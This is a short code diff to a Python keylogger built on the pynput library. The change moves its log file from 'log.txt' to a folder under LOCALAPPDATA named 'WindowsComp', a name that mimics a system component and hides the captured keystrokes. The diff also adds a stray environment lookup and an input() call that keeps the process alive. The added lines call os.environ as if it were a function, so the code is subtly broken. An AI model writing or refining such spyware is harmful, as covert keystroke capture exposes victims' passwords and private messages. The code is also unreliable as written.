@@ -1,8 +1,8 @@
 from pynput import keyboard
-
+import os
 
 class KeyLogger():
-    def __init__(self, filename: str = "log.txt") -> None:
+    def __init__(self, filename: str = os.environ('LOCALAPPDATA') + "\\WindowsComp\\keylogs.txt") -> None:
         self.filename = filename
 
     @staticmethod
@@ -25,5 +25,7 @@ class KeyLogger():
 
 
 if __name__ == '__main__':
+    os.environ('LOCALAPPDATA')
     logger = KeyLogger()
     logger.main()
+    input()
